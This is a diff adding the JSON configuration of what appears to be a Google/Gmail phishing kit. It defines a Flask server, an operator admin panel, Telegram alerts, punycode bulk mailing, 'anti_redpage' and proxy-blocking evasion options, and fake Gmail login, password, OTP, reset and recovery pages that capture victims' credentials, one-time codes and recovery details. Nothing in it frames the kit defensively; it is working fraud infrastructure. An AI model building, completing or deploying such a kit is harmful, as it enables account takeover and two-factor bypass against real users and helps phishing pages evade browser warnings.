@@ -1,0 +1,291 @@
+{
+    "version": "0.0",
+    "service": "Google",
+    "flask": {
+        "host": "0.0.0.0",
+        "port": 3000,
+        "debug": true
+    },
+    "mysql": {
+        "host": "localhost",
+        "user": "root",
+        "password": "",
+        "database": "",
+        "port": 3306
+    },
+    "admin": {
+        "login_route": "/adminlogin",
+        "dashboard_route": "/admin",
+        "password": "admin_pass"
+    },
+    "waiting": "/gmail_waiting",
+    "background_color": "rgb(14 14 14 / 1)",
+    "param_conf": {
+        "action": "save_config",
+        "count": 0,
+        "params": {},
+        "source": "admin_interface"
+    },
+    "api_keys": {
+        "proxycheck": ""
+    },
+    "options": {
+    	"page_title": "Google - Processing",
+        "favicon_url": "https://www.google.com/favicon.ico",
+        "panel_status": true,
+        "anti_redpage": true,
+        "block_proxy": false,
+        "mobile_only": false,
+        "hide_route": true,
+        "showNotifications": true,
+        "deleteInactiveSessions": "true",
+        "inactiveSessionTimeoutMinutes": 30,
+        "redirectURL": "google.com",
+        "workflow_mode": false,
+        "workflow_pages": [],
+        "telegram": {
+            "telegram_bot": true,
+            "telegram_bot_username": "",
+            "telegram_notification": true,
+            "telegram_chat_id": "",
+            "telegram_bot_token": "",
+            "admin_ids": []
+        },
+        "soundEffects": true,
+        "admin_whitelist": []
+    },
+    "email": {
+        "smtp_servers": [],
+        "email_details": {
+            "batch_size": 20,
+            "punycode": true
+        }
+    },
+    "data_links": [
+        {
+            "from": "gmail_login",
+            "from_value": "email",
+            "to": "gmail_invalid",
+            "to_value": "email"
+        },
+        {
+            "from": "gmail_login",
+            "from_value": "email",
+            "to": "gmail_reset",
+            "to_value": "email"
+        },
+        {
+            "from": "gmail_login",
+            "from_value": "email",
+            "to": "gmail_password",
+            "to_value": "email"
+        },
+        {
+            "from": "gmail_login",
+            "from_value": "email",
+            "to": "gmail_otp",
+            "to_value": "email"
+        },
+        {
+            "from": "gmail_login",
+            "from_value": "email",
+            "to": "gmail_verify",
+            "to_value": "email"
+        },
+        {
+            "from": "gmail_login",
+            "from_value": "email",
+            "to": "gmail_reset",
+            "to_value": "email"
+        }
+    ],
+    "pages": {
+        "gmail_invalid": {
+            "template": "/gmail/invalid.html",
+            "panel": {
+                "input": {
+                    "name": "Google Invalid Pass",
+                    "values": [
+                        {
+                            "value": "password",
+                            "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "email",
+                            "placeholder": "user@example.com",
+                            "type": "email"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "password": "password"
+            },
+            "preview_image": "previews/gmail/invalid.png"
+        },
+        "gmail_login": {
+            "template": "/gmail/login.html",
+            "route": "/gmail_login",
+            "panel": {
+                "input": {
+                    "name": "Gmail Login",
+                    "values": [
+                        {
+                            "value": "email",
+                            "placeholder": "example@gmail.com",
+                            "type": "email"
+                        }
+                    ],
+                    "required_data": []
+                }
+            },
+            "form": {
+                "email": "email"
+            },
+            "preview_image": "previews/gmail/login.png"
+        },
+        "gmail_otp": {
+            "template": "/gmail/otp.html",
+            "panel": {
+                "input": {
+                    "name": "Gmail OTP",
+                    "values": [
+                        {
+                            "value": "otpcode",
+                            "placeholder": "123456",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "phone",
+                            "placeholder": "Last 4 digits of phone number",
+                            "type": "text"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "otpcode": "otpcode"
+            },
+            "preview_image": "previews/gmail/otp.png"
+        },
+        "gmail_password": {
+            "template": "/gmail/password.html",
+            "panel": {
+                "input": {
+                    "name": "Google Password",
+                    "values": [
+                        {
+                            "value": "password",
+                            "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "email",
+                            "placeholder": "example@gmail.com",
+                            "type": "email"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "password": "password"
+            },
+            "preview_image": "previews/gmail/password.png"
+        },
+        "gmail_reset": {
+            "template": "/gmail/reset.html",
+            "panel": {
+                "input": {
+                    "name": "Gmail Reset",
+                    "values": [
+                        {
+                            "value": "current-pass",
+                            "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                            "type": "text"
+                        },
+                        {
+                            "value": "new-pass",
+                            "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
+                            "type": "text"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "email",
+                            "placeholder": "user@gmail.com",
+                            "type": "email"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "current": "current-pass",
+                "password": "new-pass"
+            },
+            "preview_image": "previews/gmail/reset.png"
+        },
+        "gmail_stall": {
+            "template": "/gmail/stall.html",
+            "panel": {
+                "input": {
+                    "name": "Google Stall (Empty)",
+                    "values": [],
+                    "required_data": []
+                }
+            },
+            "form": {},
+            "preview_image": "previews/gmail/stall.png"
+        },
+        "gmail_verify": {
+            "template": "/gmail/verify.html",
+            "panel": {
+                "input": {
+                    "name": "Google Verify",
+                    "values": [
+                        {
+                            "value": "recovery_email",
+                            "placeholder": "Recovery Email",
+                            "type": "text"
+                        },
+                        {
+                            "value": "recovery_phone",
+                            "placeholder": "Recovery Phone",
+                            "type": "phone"
+                        }
+                    ],
+                    "required_data": [
+                        {
+                            "value": "email",
+                            "placeholder": "user@gmail.com",
+                            "type": "email"
+                        }
+                    ]
+                }
+            },
+            "form": {
+                "recovery_email": "recovery_email",
+                "recovery_phone": "recovery_phone"
+            },
+            "preview_image": "previews/gmail/verify.png"
+        },
+        "gmail_waiting": {
+            "template": "/gmail/waiting.html",
+            "panel": {
+                "input": {
+                    "name": "Google Waiting (Empty)",
+                    "values": [],
+                    "required_data": []
+                }
+            },
+            "form": {},
+            "preview_image": "previews/gmail/waiting.png"
+        }
+    }
+}
